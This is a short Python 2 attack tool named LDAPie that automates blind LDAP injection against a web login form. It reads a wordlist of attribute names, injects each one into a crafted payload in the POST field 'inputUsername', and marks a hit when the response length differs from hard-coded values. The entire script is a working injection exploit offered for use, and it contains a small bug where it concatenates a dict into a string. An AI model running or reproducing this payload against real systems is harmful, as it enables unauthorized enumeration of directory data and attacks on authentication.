#/usr/bin/python2
#Title: LDAPie
#Author: Tepidangler
#Date: Today
#Description: A tool to bruteforce LDAP attributes and Values on a webapp that makes LDAP queries using both POST and
#	      GET requests. I got the idea for this tool while doing a CTF ;) and making manual Blind LDAPi's now I'm
#	      passing the savings onto YOUUUUU!!!!!!!!! XD

# importing the modules we'll need

import requests, sys

#Let's make things look a little bit better and easier for people to use
print("""\033[2;36m Usage: python LDAPie.py <wordlist> <url>
#####################################################
	 Welcome to LDAPie by Tepidangler
	 Email: tepidangler@protonmail.com
	 Info: This is a program created out of 
               necessity since I couldn't find a
	       program that did LDAP injection
               via POST requests
         TODO: Add GET requests, add switches,
               loosen up request params, automate
#####################################################
""")

# making our class

class Ldapie:

#Initialize the program
    def __init__(self,filename,url):
        self.filename = filename
        self.url = url
#Function to take the file from sys args, read them, then we'll use that to build our request

    def count(self,filename):
        with open(filename, 'r') as f:
            for i, l in enumerate(f):
                pass
        return i + 1

    def req(self,filename,url):

        with open(filename, 'r') as f:
            a = f.read().splitlines()
            for x in a:
                data = {'inputUsername':'ldapuser)('+x+'=*))(&'+x+'=void)'}
                r = requests.post(url,data=data)
                l = r.text
                if len(l) not in [2810,2822]:
                    print("\033[1;32mVALID LDAP INJECTION: "+data)
            pass



#main
if len(sys.argv) > 2:
    m = Ldapie(sys.argv[1],sys.argv[2])
    d = m.req(sys.argv[1],sys.argv[2])
else:
    print("""\033[1;31mPLEASE PROVIDE WITH SOME ARGUMENTS
Usage: python LDAPie.py <wordlist> <url>
\n""")
